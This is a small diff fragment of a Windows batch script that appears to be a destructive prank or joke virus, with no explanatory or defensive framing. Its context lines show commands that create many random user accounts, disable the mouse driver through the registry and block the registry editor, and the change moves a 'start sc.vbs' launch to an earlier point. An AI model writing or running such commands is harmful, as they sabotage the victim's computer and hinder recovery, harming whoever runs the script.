@@ -185,6 +185,7 @@ net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
+start sc.vbs
 @echo off
 rem ---------------------------------
 rem Disable Mouse
@@ -193,4 +194,3 @@ reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
 rem ---------------------------------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
-start sc.vbs
